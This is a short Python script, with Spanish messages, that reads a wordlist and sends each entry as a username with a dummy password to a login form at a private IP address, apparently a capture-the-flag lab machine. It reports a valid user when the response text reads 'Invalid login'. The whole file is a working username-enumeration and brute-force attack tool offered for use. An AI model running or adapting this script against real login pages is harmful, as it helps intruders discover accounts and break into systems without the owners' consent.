#!/bin/python3

import sys, signal, requests
from pwn import *;
from colorama import Fore, init

if len(sys.argv) < 2:
    print(f"\n\n[!] Uso: python3 {sys.argv[0]} [DICCIONARIO]\n")
    print(f"\t\tEjemplo: python3 {sys.argv[0]} rockyou.txt\n\n")
    sys.exit(1)

def def_handler(sig, frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

# Variables
url = "http://10.10.11.160:5000/login"
init()

def makeRequest():
    bar = log.progress("Iniciando Ataque de Fuerza Bruta")
    time.sleep(2)

    diccionario = open(sys.argv[1]);
    bar2 = log.progress("Probando Usuarios")

    for user in diccionario:
        username = user.strip()
        data = { 'username': username, 'password': 'cualquiercosa'}
        bar2.status(Fore.RED + f"{username}")
        req = requests.post(url, data=data) 
        res = req.text
        
        if 'Invalid login' in res:
            bar.status(Fore.GREEN + f"Usuario valido => {username}")
            sys.exit(0)

if __name__ == '__main__':
    makeRequest()